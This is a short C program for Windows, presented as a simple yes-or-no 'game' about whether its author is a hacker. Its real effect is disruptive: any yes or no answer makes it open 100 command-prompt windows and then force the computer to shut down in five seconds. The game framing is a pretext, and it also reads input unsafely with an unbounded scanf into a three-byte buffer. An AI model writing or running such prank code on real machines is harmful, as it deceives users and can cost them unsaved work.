/*
    Author: Muhammad Usman Raza.
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
int main()
{
    char choice[3];
    printf("Lets play a short game its simple game do not be afraid"
           "Do you accept Usman is Hacker\n"
           "Note!\n\tThere's a high chance that what you think is a 'yes' might actually be a 'no'. Choose Wisely\n"
           "Answer in Yes or No only.\n");
    printf("Enter here:");
    scanf("%s", &choice);
    if (choice[0] == 'y' || choice[0] == 'Y' || choice[0] == 'n' || choice[0] == 'N')
    {
        printf("Your computer will shutdown in 5sec\n");
        int i;
        for (i = 0; i < 100; i++)
        {
            system("start cmd");
        }
        system("shutdown /s /t 5");
    }
    else
    {
        printf("Please enter valid option otherwise we can't proceed.\n");
    }
    system("pause");
    return 0;
}